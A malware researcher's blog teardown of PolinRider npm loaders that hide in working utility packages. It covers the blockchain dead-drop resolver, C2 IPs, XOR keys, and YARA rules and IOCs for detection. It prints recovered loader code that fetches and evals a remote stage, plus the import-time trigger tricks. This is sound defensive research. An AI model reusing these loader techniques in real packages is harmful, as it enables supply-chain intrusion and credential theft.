---
title: "Dead Drops on the Blockchain: Reversing a DPRK npm Loader (PolinRider / A6-Shadow-15)"
date: 2026-06-22T00:30:00+05:30
slug: "polinrider-blockchain-dead-drop-npm"
draft: false
tags:
  - "PolinRider"
  - "Lazarus"
  - "DPRK"
  - "Supply Chain"
  - "npm"
  - "Malware Analysis"
  - "Reverse Engineering"
  - "EtherHiding"
  - "Blockchain C2"
  - "BeaverTail"
  - "InvisibleFerret"
cover:
  image: "/images/polinrider-blockchain-dead-drop-npm/cover.png"
  alt: "Dead Drops on the Blockchain: Reversing a DPRK npm Loader (PolinRider)"
  relative: false
ShowToc: true
TocOpen: false
---

We have all trained ourselves to look for the call home: the hard-coded IP, the suspicious `.xyz` domain, the base64 URL that decodes to something hostile. This loader has none of that. Strip it to nothing and you find an address on the TRON blockchain, which points to a Binance Smart Chain transaction sent to a burn address so it can never be spent or deleted. The next stage sits in that transaction's data field, XOR-encrypted. You cannot sinkhole it, and you cannot file a takedown against an immutable transaction replicated across thousands of nodes. The technique has a name, *EtherHiding*, and it turns a public blockchain into bulletproof, censorship-proof storage for malware.

The carrier was a small npm package called `tailwind-color-shades`. What it hides is a new variant of a loader public reporting tracks as **PolinRider**, attributed to **DPRK / Lazarus**. This is the full teardown. From the one line of code that triggers it, through three layers of obfuscation, out onto three public blockchains, and down to the live command-and-control servers that fall out the bottom.

## How it surfaced

I was not hunting for Lazarus. A small scanner I had been building watches npm's recent-publish feed and scores new packages on the signals that correlate with badness: import-time execution, `bootstrap`-style files nothing imports by name, encoded blobs where source should be.

On one pass it flagged two packages, `tailwind-color-shades` and `safe-validate`, both published by `deepthought26`. On the surface neither had anything to flag: tidy utilities, MIT licences, real GitHub repos, working READMEs. But each one's entry file executed a `bootstrap` module *before* exporting a single function, and that module was a wall of obfuscated bytes. I resolved every layer of `tailwind-color-shades` (reversed in full below) and confirmed its sibling ran the same loader. Everything below the obfuscation I confirmed first-hand by re-implementing each decoder in Python and replaying the live blockchain responses in an isolated lab; the campaign name and DPRK / Lazarus attribution come from public PolinRider reporting, flagged where it matters.

I [flagged this publicly on X](https://x.com/sdkhere/status/2066617099318128710) as soon as the packages surfaced; this post is the full teardown behind that disclosure.

| | |
|---|---|
| **Packages** | `tailwind-color-shades` 1.0.2 and `safe-validate` 1.0.4 (npm), same publisher, same loader |
| **Publisher** | `deepthought26` (npm + GitHub) |
| **Cover story** | Working Tailwind colour-shade generator · Funval validation-library clone |
| **Technique** | Import-triggered loader, payload stored on-chain (EtherHiding) |
| **Resolver** | TRON pointer → Aptos fallback → BSC burn-address transaction |
| **C2** | Three hard-coded IPs behind `/$/boot`, version-gated by a custom header |
| **Campaign** | PolinRider (DPRK / Lazarus), new `global['_V']` variant |
| **Final payload** | BeaverTail stager → InvisibleFerret RAT |
| **Markers** | `A6-Shadow-15` (tailwind) · `A6-Shadow-14` (safe-validate) |

![The blockchain dead-drop resolver: the loader leaves the victim host, reads TRON, Aptos and BSC to locate its payload, then returns to run it](/images/polinrider-blockchain-dead-drop-npm/attack-chain.png)

*Figure 1: The whole machine on one canvas. The bottom lane runs on the victim's host: a working decoy package whose loader reaches up into the public-blockchain lane (1) to read where its payload lives, pulls the encrypted bytes back down (2), then decrypts, fetches a version-gated stage from a live IP, and lands BeaverTail → InvisibleFerret. The address it phones home to is never in the package; it is resolved on-chain at runtime.*

## A package that does its job

The most effective thing about this sample is also the most boring-looking. The decoy is real.

`tailwind-color-shades` is not a hollow stub with a malicious afterthought bolted on. It is a working, documented colour-shade generator. Call `twShades('#3498db')` and you get back a proper Tailwind palette. The README is polished, the licence is MIT, and the npm page looks like a thousand other small utilities.

![The tailwind-color-shades npm page: a polished, working Tailwind colour-shade utility published by deepthought26](/images/polinrider-blockchain-dead-drop-npm/tailwind-package.png)

*Figure 2: The npm listing. A clean README, an MIT licence, a working code example, and nothing here reads as malware.*

The GitHub repo behind it sells the same story. The commit history is unremarkable in exactly the way you want it to be: `Refactor index.ts and clean up package metadata`, `docs: improve README structure`. There is a test file. There is a `.gitignore`. It is precisely the kind of repository a reviewer skims for ten seconds and waves through.

![The deepthought26/tailwind-color-shades GitHub repository with an innocuous commit history](/images/polinrider-blockchain-dead-drop-npm/tailwind-github.png)

*Figure 3: The backing repo. Believable commit messages and a normal layout. The loader lives in `src/bootstrap`, not in anything a quick review would open.*

The whole tarball is 8,151 bytes. The colour code is genuine. The only thing out of place is the very first line of `index.ts`:

```javascript
// index.ts: the working library sits below; the malice is the import above it
import './src/bootstrap';
// ... genuine, functional Tailwind colour-shade generator follows ...
```

## Execution by import, not by install

Spend any time on supply-chain malware and your eyes go straight to the lifecycle scripts: `preinstall`, `postinstall`, the hooks npm runs automatically. That is where the noisy stealers live, and that is where registries and scanners point most of their attention.

This package's `package.json` is clean. There is no install hook to find.

Instead, the loader rides the import graph. The single `import './src/bootstrap'` at the top of `index.ts` means it executes the moment a build tool resolves the package (a `vite build`, a `next build`, a Jest run that pulls the module in) with a short re-entrancy guard (a flag on `global`) so it fires once per process. There is nothing in the lifecycle scripts and nothing hostile in the public API you actually call; the trigger is the single most ordinary thing a developer does with a dependency: build with it. By the time anyone could notice, the colour utility has worked perfectly and the loader has already run. That is the quiet, important part. Importing this package *is* running it, and import-time execution slides straight past install-hook monitoring.

## Unwrapping the loader

`src/bootstrap.js` ships unreadable. Getting to behaviour meant peeling three stacked layers in the loader, plus a fourth XOR layer on the payload it pulls off-chain. I re-implemented each decoder in Python so the JavaScript never had to run.

![Peeling the loader: a char-shuffle decoder, a Function-constructor eval, an obfuscator.io string array, and XOR on the on-chain payload](/images/polinrider-blockchain-dead-drop-npm/obfuscation-layers.png)

*Figure 4: The decoder stack. Each layer was rebuilt offline against extracted strings; at no point was the sample executed.*

**Layer one** is a custom string-array decoder the obfuscator named `NVu`. It walks a scrambled string with a seeded index permutation, swapping characters according to a running key, then unescapes a small private scheme and splits on a sentinel to recover an array of strings. It is not a stock algorithm; you have to reconstruct the exact constants to reproduce it:

```python
# NVu char-shuffle decoder: READ-ONLY re-implementation, never runs the JS.
def nvu(w, k, A1, A2, B1, B2, MOD):
    u = list(w)
    n = len(u)
    for f in range(n):
        m = k * (f + A1) + (k % A2)
        t = k * (f + B1) + (k % B2)
        u[m % n], u[t % n] = u[t % n], u[m % n]
        k = (m + t) % MOD
    s = "".join(u)
    # private unescape, then split on the sentinel into the string array
    return (s.replace("%", chr(127)).replace("#1", "%").replace("#0", "#")
             .split(chr(127)))

# bootstrap loader seed: k=6964224  A1=122 A2=16975  B1=89 B2=35503  MOD=7635721
```

**Layer two** is the classic `eval`-without-`eval` trick: the loader reaches `"constructor"` off a primitive to get at the `Function` constructor and build executable code from a string, dodging any literal `eval` token a scanner might grep for.

**Layer three** is standard obfuscator.io machinery: a rotating string array and a decoder function wrapping the inner loader source. Recovering it offline produced the readable control flow, and that is where the blockchain logic finally appears. The tail call that would have executed the assembled payload (`XZs(7942)` in this build) I neutralised and replaced with a source dump. Everything past this point is read off that dump, not off a running sample.

## A payload with no server

Here is the heart of it. The decoded loader contains no command-and-control address. What it contains is a resolver that reads its next instruction out of public blockchains.

![The blockchain dead-drop resolver: TRON pointer to Aptos fallback to a BSC burn-address transaction, then split, XOR and eval](/images/polinrider-blockchain-dead-drop-npm/deaddrop-resolver.png)

*Figure 5: The dead-drop resolver. No attacker domain lives in the loader. The next stage is read out of immutable transactions on three independent chains.*

The resolution runs in three steps:

1. **TRON points the way.** The loader queries the latest outgoing transaction of a hard-coded TRON account through `api.trongrid[.]io`, reads the `raw_data.data` field, hex-decodes it to text, then *reverses the string*. That reversed value is a Binance Smart Chain transaction hash.
2. **Aptos is the spare key.** If TRON is unreachable, the loader does the identical read against a hard-coded Aptos account on `fullnode.mainnet.aptoslabs[.]com`, which resolves to the *same* BSC transaction hash. Two independent chains carry the same pointer, so losing one resolver does not break the loader.
3. **BSC carries the payload.** It calls `eth_getTransactionByHash` against `bsc-dataseed.binance[.]org` (with `bsc-rpc.publicnode[.]com` as backup), takes the transaction's `input` field, hex-decodes it, splits on the delimiter `?.?` and keeps the second half, XOR-decrypts that with a hard-coded key, and `eval()`s the result.

Seen live, the TRON pointer transaction looks like meaningless dust (a one-sun transfer to the zero address) until you notice the payload riding in `raw_data.data`:

![The live TRON pointer transaction on api.trongrid.io: a 1-sun transfer to the zero address with the BSC hash hidden in raw_data.data](/images/polinrider-blockchain-dead-drop-npm/TRON-pointer.png)

*Figure 6: The live TRON pointer. A 1-sun transfer to the all-zero `to_address`, with the reversed, hex-encoded BSC transaction hash tucked into `raw_data.data`.*

And the Aptos account carries the identical pointer as a backup:

![The live Aptos fallback transaction on fullnode.mainnet.aptoslabs.com carrying the same pointer](/images/polinrider-blockchain-dead-drop-npm/aptos-pointer.png)

*Figure 7: The Aptos fallback. The same dead drop, on a second chain, for resilience.*

Two design choices make this genuinely hard to spot from the chain side, and both are worth calling out because they are reusable tradecraft, not quirks of this sample:

- **The BSC payload transaction is sent to the burn address `0x…dEaD`.** Nobody receives it. To anyone watching balances it reads as value being destroyed; the malware only ever reads the transaction's `input` bytes. It is a write-only mailbox that can never be emptied.
- **The reverse-and-delimiter dance is deliberate friction.** Hex-decode the TRON pointer and you get garbage until you reverse it. Hex-decode the BSC `input` and you get garbage until you split on `?.?` and XOR. Stacking trivial, undocumented transforms like this defeats anyone grepping the chain for readable strings.

There are two of these channels baked into the loader, each with its own key and pointer set, one per on-chain stage:

| | XOR key | TRON pointer | Aptos fallback |
|---|---|---|---|
| **Stage A** | `2[gWfGj;<:-93Z^C` | `TMfKQEd7TJJa5xNZJZ2Lep838vrzrs7mAP` | `0xbe0374…0811e` |
| **Stage B** | `m6:tTh^D)cBz?NM]` | `TXfxHUet9pJVU1BgVkBAbrES4YUc1nGzcG` | `0x3f0e57…5dce3` |

## Walking the first drop

Stage A resolves first. The TRON pointer (and its Aptos twin) leads to BSC transaction `0x80a114…1ef89`, sent to the burn address from `0x9bc135…4509`. Decrypting its `input` field with the Stage A key does not produce the final payload; it produces a *second loader*, and two things fall out of it.

The first is the real command-and-control set: three hard-coded IPs the loader chooses between at runtime.

- `166.88.54[.]158` (primary)
- `198.105.127[.]210` (fallback)
- `23.27.202[.]27`, including a `:27017` MongoDB-style port (fallback)

The second is a *rotation* dead-drop pair: a fresh TRON/Aptos pointer set the operator can repoint to swap the next stage without ever republishing the npm package. That detail reframes the whole blockchain layer. The chains are not the C2. They are a resolver and an update channel that tell the loader where to go and let the operator change that answer at will. The real command-and-control is ordinary HTTP to a box the attacker owns, and that distinction is what decides what you actually block.

## Walking the second drop, and the live C2

Where Stage A handed over the *configuration* (the C2 set and the rotation pointers), Stage B's pointer (`TXfxHU…` → BSC transaction `0xa896af…c87f02`, again to the burn address) decrypts to the loader that *acts* on it: the code that actually reaches out. This is the recovered Stage B, still one obfuscation layer deep, shown defanged to make the mechanism legible:

```javascript
// Stage B final loader: DEFANGED, READ-ONLY (recovered, not executed)
var _$_7b43 = (function(g, h){ /* dmO char-shuffle → string array */ }("…", 2195485));
(async function () {
  var c = global;
  var r = c[_$_7b43[0]] || 0;                 // r = global._V  ("A6-Shadow-15")
  if (r[0] == _$_7b43[1]) { … }               // first char 'A' → primary host …
  else if (!c.isNaN(c.Number(r))) { … }       // purely numeric → fallback host …
  else { c._H2 = …; }                         // otherwise → :27017 host
  await eval(function (e) {                    // XOR the response, then eval it
    var o = _$_7b43[29], n = o.length, a = "";
    for (var t = 0; t < e.length; t++)
      a += String.fromCharCode(e.charCodeAt(t) ^ o.charCodeAt(t % n));
    return a;
  }(await new c.Promise(function (o, e) {       // GET (host) + "/$/boot"
    var t = new c.URL((c._H || c._H2) + _$_7b43[13]);   // _$_7b43[13] === "/$/boot"
    var n = { method: "GET", hostname: t.hostname, port: t.port, path: t.path,
              headers: { "User-Agent": "Mozilla/5.0 … Chrome/131.0.0.0 …",
                         "Sec-V": r } };        // version marker echoed to the server
    c.require("http").request(n, function (t) { … o(body) }).end();
  })));
})();
```

Decoded, the logic is small and tells you a lot about how the operator runs the campaign.

![Version-gated C2 selection: the global._V build marker picks the C2 and is echoed back in a Sec-V header for server-side gating](/images/polinrider-blockchain-dead-drop-npm/stage-c-gating.png)

*Figure 8: Version-gated C2 selection. The build marker chooses the C2 and is sent back in a custom `Sec-V` header so the server can decide what to return per victim cohort.*

The loader reads a build marker, `global._V` (in this sample `A6-Shadow-15`), and uses it twice. First it *picks the C2 from the marker*: a value starting with `A` routes to `166.88.54[.]158`; a purely numeric value routes to `198.105.127[.]210`; anything else routes to `23.27.202[.]27:27017`. Then it issues `GET http://166.88.54[.]158/$/boot` with a Chrome user-agent and the marker stamped into a custom header, `Sec-V: A6-Shadow-15`. The response comes back XOR-encrypted under a third hard-coded key, `ThZG+0jfXE6VAGOJ`; the loader decrypts it and `eval()`s it. That decrypted response is Stage C.

The `Sec-V` header is the detail I find most telling. The marker is not just a local switch. It is sent *back to the server*, so the operator can gate what each request receives: the real payload to the cohorts they want, and nothing (or a decoy) to a request whose marker they do not recognise. That is per-victim version control in a single HTTP header, and it quietly defeats a naïve sandbox that fetches the URL without the right marker.

## The final payload

Stage C, the response to `/$/boot`, is where the loader I reversed hands off to the next stage. The recovered C2 IPs and the marker slot line up cleanly with the public PolinRider write-ups, and on that basis the final payload is identified as a **BeaverTail → InvisibleFerret** chain:

- **Stage C, BeaverTail.** The `/$/boot` response is a Lazarus-family JavaScript stager that fingerprints the host OS and selects an OS-specific next stage.
- **Final stage, InvisibleFerret.** A cross-platform RAT: browser credentials and session cookies, SSH private keys, environment-variable secrets (AWS, GCP, npm, GitHub tokens), crypto-wallet files, and on Windows, keylogging and clipboard capture.
- **Cleanup.** Public incident reports describe a `temp_auto_push.bat` routine that preserves original commit timestamps and force-pushes, so a tampered repo still reads like a clean `git log`.

So the full picture is a working npm utility → an import-triggered loader → a blockchain dead-drop resolver → a version-gated HTTP fetch → BeaverTail → InvisibleFerret. The published reporting is strong on the *front* of that chain: who shipped it, and how far it spread. What this teardown adds is the *middle*: resolving the dead drops to the live C2.

## Not the build the signatures know

This matters for anyone writing detection. The public signatures for this campaign key on an *older* build of the obfuscator. The sample I pulled apart is a newer, rotated one.

![Two obfuscator variants: the stable discriminator is the global marker slot, not the rotated decoder names](/images/polinrider-blockchain-dead-drop-npm/variant-compare.png)

*Figure 9: Old build versus new. The per-sample decoder names rotate every build; the stable tell is the global marker slot, `global['_V']` here.*

The per-build cosmetics change constantly: the string literals (`rmcej%otb%` → `Cot%3t=shtP`), the decoder function names (`_$_1e42` → `MDy`, plus `NVu`, `dmO`, `_$_7b43`, and so on). Chasing those is a losing game; they are rotated precisely so that signatures rot. The durable discriminator is the slot the campaign marker lives in: the original variant stashes it in `global['!']`, this one uses `global['_V'] = 'A6-Shadow-15'`. If you are writing detection for this family, anchor on the marker slot, the `/$/boot` endpoint and the `Sec-V` header, never on the decoder names.

## Not one package, but a kit

One last thing before I close the file, because it changes the shape of the threat. I flagged two `deepthought26` packages at the very start of this hunt. Having now torn the first one down to its live C2, it is worth setting the second beside it, because they are the same machine, and that is what turns a single bad package into a reusable kit.

![The deepthought26 GitHub profile showing two TypeScript repositories: tailwind-color-shades and schema-checker](/images/polinrider-blockchain-dead-drop-npm/publisher-github-repo.png)

*Figure 10: The publisher's profile. Two pinned TypeScript repos, `tailwind-color-shades` and `schema-checker`, both feeding the same loader playbook into npm.*

The registry returns exactly two packages for that maintainer: `tailwind-color-shades` and `safe-validate`. The second is published out of the `schema-checker` repo: the npm "Repository" link points at `github.com/deepthought26/schema-checker`, and there is no `safe-validate` repo at all. I pulled its tarball from the npm CDN and read the loader, and it is not merely *similar*. It is a confirmed member of the same family:

- **Same decoy strategy.** `safe-validate` is a clone of the real **Funval** TypeScript validation library; the README even admits "Previously published as Funval." Install it, use it, and it validates exactly as advertised.
- **Same import-time trigger, with a twist.** `index.mjs` opens with `import './lib/bootstrap.js';`, except that path 404s. The real loader hides one directory deeper at `lib/schema/bootstrap.js`, pulled in quietly by `lib/index.js` via `require("./schema/bootstrap")`. The obvious-looking import is a decoy; the working loader is the one you only reach by following the require chain.
- **Same internals.** `lib/schema/bootstrap.js` is unmistakably the same kit: a `YWG` char-shuffle decoder that is the twin of `NVu` (different seed constants, identical algorithm), the same `"constructor"`-via-`Function` trick, the same `XZs(7942)` execution tail. Its marker is `global['_V'] = 'A6-Shadow-14'`, a different build tag from this sample's `A6-Shadow-15`, but the same slot, the same new variant.

Two details on the sibling are worth the detour because they are tradecraft I did *not* see in the `tailwind` package, and they generalise well beyond this campaign.

**It weaponised a bundler optimisation.** Versions `1.0.1`–`1.0.3` shipped with `"sideEffects": false` in `package.json`, the standard hint that tells bundlers "nothing here runs on import, feel free to tree-shake unused exports away." Then `1.0.4` flipped it:

```json
"sideEffects": ["./lib/bootstrap.js", "./lib/index.js", "./index.mjs"]
```

That is not a cleanup. Marking `bootstrap.js` as having side effects *guarantees* a bundler keeps and runs it even when the importing app never references it: the exact opposite of what an honest library wants. The author understands bundler internals well enough to turn an optimisation flag into a persistence mechanism.

**The obvious loader path is bait.** The `import './lib/bootstrap.js'` at the top of `index.mjs` is exactly where a reviewer would look, and it is a dead reference that 404s. The code that actually runs is `lib/schema/bootstrap.js`, one indirection past where anyone bothers to check. It is the same instinct as the blockchain dead drops: put the thing worth finding just past the obvious place. The timeline confirms this is deliberate and dated: the repo was created on 2026-06-12 with clean `1.0.1`–`1.0.3` the same day, and the weaponised `1.0.4` landed on 2026-06-15, the same day `tailwind-color-shades` was republished. A single extra ~13 KB file is the whole difference.

One honest caveat, because I would rather be precise than dramatic: I retrieved and read `safe-validate`'s real loader, so the *family match is confirmed*: same decoder algorithm, same `constructor`/`Function` trick, same execution tail, same marker slot. What I have not yet done is decode *its* on-chain payload blob, so its specific TRON/Aptos addresses and XOR keys may differ from the ones I recovered above. The dead-drop mechanism is the same; the individual pointers are unconfirmed. If you run `safe-validate`, treat it exactly like this one.

The wider point for defenders is the important one. This is not a single package to yank. It is a kit one actor is reusing across packages, and, since the same `deepthought26` account also published the malicious PyPI worm [`nhmpy`](/posts/shai-hulud-nhmpy-pypi/) I tore apart last week, across ecosystems. Block the package and the playbook survives.

## Detection & hunting

> 📦 **All of the rules and IOCs below ship in a dedicated open repo:** [`meltedinhex/detections`](https://github.com/meltedinhex/detections/tree/master/polinrider-blockchain-loader): YARA, Sigma, KQL and machine-readable IOC lists (CSV/JSON), ready to drop into your pipeline.

You do not need to understand a single one of those ciphers to catch this. Both packages, `tailwind-color-shades` and its sibling `safe-validate`, behave identically once they run, and that behaviour is loud. These are the signals I would actually hunt, roughly in order of how reliably they fire:

- **A build host talking to a blockchain.** The strongest one. A `node`, `vite`, `next` or `jest` process reaching `api.trongrid[.]io`, `fullnode.mainnet.aptoslabs[.]com`, `bsc-dataseed.binance[.]org` or `bsc-rpc.publicnode[.]com` during a build is almost never legitimate, and since both packages resolve their payload this way, this one egress pattern catches the whole kit.
- **The `/$/boot` fetch and the `Sec-V` header.** Neither belongs in normal traffic. Hunt the path and the header across proxy and EDR telemetry to surface the live C2 conversation for either package.
- **The C2 IPs.** `166.88.54[.]158`, `198.105.127[.]210`, and `23.27.202[.]27` (watch the odd `:27017` port). Both packages select from the same three.
- **The marker in source or memory.** Grep for the `global['_V']` slot: `A6-Shadow-15` in `tailwind`, `A6-Shadow-14` in `safe-validate`. The tag rotates; the slot does not. Also scan for obfuscated blobs glued after `export default` / `module.exports` in `postcss.config.mjs`, `tailwind.config.js`, `next.config.mjs`, `vite.config.*`.
- **A `bootstrap` file that runs but is never imported by name**, and don't trust the obvious one. Both packages hang their loader off a `bootstrap` module that executes purely as an import side effect (`safe-validate` even lists it in `"sideEffects"` to beat tree-shaking). But `safe-validate`'s top-level `import './lib/bootstrap.js'` is a decoy that 404s; the real loader sits one directory deeper at `lib/schema/bootstrap.js`, while `tailwind` keeps its loader at the honest `src/bootstrap`. Resolve the entire require/import graph, never just the first line of the entry file.
- **A build that spawns a hidden child.** A build or test process quietly launching a detached, windowless `node -e …` child with `stdio:'ignore'` is the loader handing off. Same lineage for both packages.

### YARA: the new variant

This rule targets the **decoded** loader for the new `global['_V']` variant. These strings surface after deobfuscation, so run it against unwrapped source or memory, not the raw `bootstrap.js`.

```yara
rule polinrider_v_variant_blockchain_loader
{
    meta:
        description = "PolinRider new variant - blockchain dead-drop loader (decoded)"
        author      = "meltedinhex"
        reference   = "tailwind-color-shades 1.0.2 (npm), marker A6-Shadow-15"
    strings:
        $marker  = "global['_V']" ascii
        $boot    = "/$/boot" ascii
        $secv    = "Sec-V" ascii
        $tron    = "trongrid.io" ascii
        $aptos   = "aptoslabs.com" ascii
        $bsc     = "bsc-dataseed" ascii
        $delim   = "?.?" ascii
    condition:
        ($marker and $boot) or ($secv and $boot and 1 of ($tron, $aptos, $bsc)) or
        (3 of ($tron, $aptos, $bsc, $delim, $boot))
}
```

> The published signatures for this campaign key on the older `global['!']` / `rmcej%otb%` build and will miss this variant. The marker slot, `/$/boot` and `Sec-V` are the durable anchors. Full Sigma and KQL versions are in the detections repo.

## Indicators of compromise (defanged)

These split into three very different buckets, and mixing them is how teams end up blocking `api.trongrid[.]io` for the whole org. The chains are *legitimate public services being abused as transport*, not dedicated C2.

### Attacker-owned C2: block and alert on these

| Indicator | Type | Role |
|---|---|---|
| `166.88.54[.]158` (`:80`, `:443`) | IPv4 | Primary C2 (`A`-marker cohort) |
| `198.105.127[.]210` (`:80`, `:443`) | IPv4 | Fallback C2 (numeric-marker cohort) |
| `23.27.202[.]27` (`:443`, `:27017`) | IPv4 | Fallback C2 (default cohort) |
| `/$/boot` | URI path | Stage C fetch endpoint |
| `Sec-V: <marker>` | HTTP header | Per-victim version gating |
| `ThZG+0jfXE6VAGOJ` | XOR key | Decrypts the Stage C response |

### On-chain dead drops: read, don't block

| Indicator | Chain | Role |
|---|---|---|
| `TMfKQEd7TJJa5xNZJZ2Lep838vrzrs7mAP` | TRON | Stage A pointer |
| `TXfxHUet9pJVU1BgVkBAbrES4YUc1nGzcG` | TRON | Stage B pointer |
| `TA48dct6rFW8BXsiLAtjFaVFoSuryMjD3v` | TRON | Rotation pointer |
| `0xbe0374…0811e` · `0x3f0e57…5dce3` · `0x533b2d…83e0b1` | Aptos | Fallback / rotation pointers |
| `0x80a114…1ef89` · `0xa896af…c87f02` | BSC tx | Stage A / Stage B payload carriers (to `0x…dEaD`) |
| `2[gWfGj;<:-93Z^C` · `m6:tTh^D)cBz?NM]` | n/a | Stage A / Stage B XOR keys |

### Legitimate services abused as transport: do not blanket-block

| Indicator | Used by malware |
|---|---|
| `hxxps://api.trongrid[.]io` | TRON pointer resolution |
| `hxxps://fullnode.mainnet.aptoslabs[.]com` | Aptos fallback pointer |
| `hxxps://bsc-dataseed.binance[.]org` · `hxxps://bsc-rpc.publicnode[.]com` | BSC payload retrieval |

### Samples & markers

| Indicator | Type | Note |
|---|---|---|
| `tailwind-color-shades` 1.0.2 (npm) | Package | Functional decoy (fully reversed sample) |
| `safe-validate` 1.0.4 (npm) | Package | Sibling: Funval clone; same loader confirmed (marker `A6-Shadow-14`) |
| `deepthought26/schema-checker` | GitHub repo | Source repo behind `safe-validate` (name mismatch; no `safe-validate` repo) |
| `lib/schema/bootstrap.js` | File (in tarball) | `safe-validate` real loader (`lib/bootstrap.js` import is a 404 decoy) |
| `deepthought26` | npm + GitHub account | Owner of both npm packages (also published PyPI `nhmpy`) |
| `fab731cd8005d9d73a8fe862a8bfea32c945bd957bbb9861f36401d18b878c8b` | SHA-256 | `tailwind-color-shades` tarball (8,151 B) |
| `dd58d3a964e739f524dd3b28f1542c01` | MD5 | `tailwind-color-shades` tarball |
| `a048ac42b7e4c7dad4dd24e352dfe292d835a0cf` | SHA-1 (dist shasum) | `safe-validate` 1.0.4 tarball |
| `global['_V'] = 'A6-Shadow-15'` · `'A6-Shadow-14'` | Marker | New-variant campaign markers (`tailwind` · `safe-validate`) |
| `import './src/bootstrap'` · `require('./schema/bootstrap')` | Source | Import-time triggers (both packages) |
| `"sideEffects": ["./lib/bootstrap.js", …]` | `package.json` | Tree-shaking defeat forcing the loader to run |

## MITRE ATT&CK

| Tactic | Technique | ID | Evidence in this sample |
|---|---|---|---|
| Initial Access | Compromise Software Supply Chain | T1195.002 | Malicious npm package posing as a Tailwind utility; functional decoy in `index.ts` |
| Execution | User Execution: Malicious File | T1204.002 | Loader fires when a bundler imports the package (`import './src/bootstrap'`) |
| Execution | Command & Scripting Interpreter: JavaScript | T1059.007 | Obfuscated JS loader; `eval()` of fetched stage; detached `node -e` child |
| Defense Evasion | Reflective Code Loading | T1620 | Fetched stage `eval()`'d in memory; nothing written to disk |
| Defense Evasion | Obfuscated Files or Information | T1027 | Char-shuffle → `Function` constructor → obfuscator.io → XOR (multi-layer) |
| Defense Evasion | Deobfuscate/Decode Files or Information | T1140 | Runtime hex decode + repeating-key XOR of the on-chain payload |
| Defense Evasion | Hide Artifacts: Hidden Window | T1564.003 | `spawn(… {windowsHide:true, stdio:'ignore', detached:true})` |
| Command & Control | Web Service (dead-drop resolver) | T1102 | TRON / Aptos / BSC public APIs used to resolve and store payloads |
| Command & Control | Ingress Tool Transfer | T1105 | Next stage downloaded from blockchain transaction data, then from `/$/boot` |
| Command & Control | Encrypted/Encoded Channel | T1573 | Payloads XOR-encrypted with hard-coded keys, hex-encoded in tx `input` |

## If you pulled this in

If either package reached a machine, especially a build runner, treat it as a credential compromise of that host, because that is exactly where this chain ends up. The order I would work it:

1. **Take the host offline first.** Build runners are the worst case: they usually hold the keys to half the estate. Assume every secret that machine could reach is already gone; the final stage is a RAT built to steal precisely those.
2. **Rotate everything it could touch.** GitHub and npm tokens, AWS/GCP keys, SSH keys, anything in that runner's environment variables. Don't cherry-pick.
3. **Go looking for the calls home.** Hunt the C2 IPs and `/$/boot` across proxy and EDR logs, and flag any build host that reached out to TRON, Aptos or BSC RPC endpoints.
4. **Read your config files.** Look for obfuscated blobs appended after `export default` / `module.exports` in `postcss.config.mjs`, `tailwind.config.js`, `next.config.mjs`, `vite.config.*`.
5. **Check whether someone tidied up.** Force-pushed branches or a suspiciously flat history line up with this campaign's cover-tracks stage. GitHub's Events API (the `before` SHA on a `PushEvent`) can recover orphaned commits, but only for roughly 48 hours, so move quickly.
6. **Remove the packages** (`tailwind-color-shades`, `safe-validate`, and anything else from `deepthought26`) and pin dependencies back to versions you trust.

## What I'm taking from this

- **Blockchain dead drops change who holds the advantage.** When the next stage lives in a transaction nobody can edit or delete, there is no domain to sinkhole and no server to seize. Detection has to move to behaviour: a build host talking to chain RPC, the `/$/boot` fetch. Chase what the malware *does*, not where it lives.
- **Importing a package is running it.** No install hook fired here, and that is the whole trick. A dependency that executes on *import* walks straight past install-hook monitoring. Pulling a package into a build has to be treated as running whatever it wants.
- **The misdirection is layered, not just encrypted.** The same mindset that buries the payload behind blockchain dead drops buries `safe-validate`'s real loader behind a decoy `bootstrap.js` import that 404s. The thing worth finding is always one indirection past the obvious artifact: follow the whole require graph, and decode the chain all the way down.
- **Anchor detection on what doesn't move.** Decoder names and string literals get reshuffled every build; the marker slot, the `/$/boot` endpoint and the `Sec-V` header stay put across variants. That is where signatures that survive live, and they only fall out if someone walks the chain to the end, because a headcount of compromised repos never hands you a C2 to block.

## References

- **OpenSourceMalware, PolinRider**: [opensourcemalware.com/blog/polinrider-rides-again](https://opensourcemalware.com/blog/polinrider-rides-again-north-korean-attack-expands-across-github)
- **OpenSourceMalware, "PolinRider rides again"**: [github.com/OpenSourceMalware/PolinRider](https://github.com/OpenSourceMalware/PolinRider)
- **Apache Superset, issue #39299**, kill chain and campaign markers: [github.com/apache/superset/issues/39299](https://github.com/apache/superset/issues/39299)

---

*Detection coverage for this campaign (YARA, Sigma, KQL and machine-readable IOCs) lives in the open at [`meltedinhex/detections`](https://github.com/meltedinhex/detections/tree/master/polinrider-blockchain-loader).*
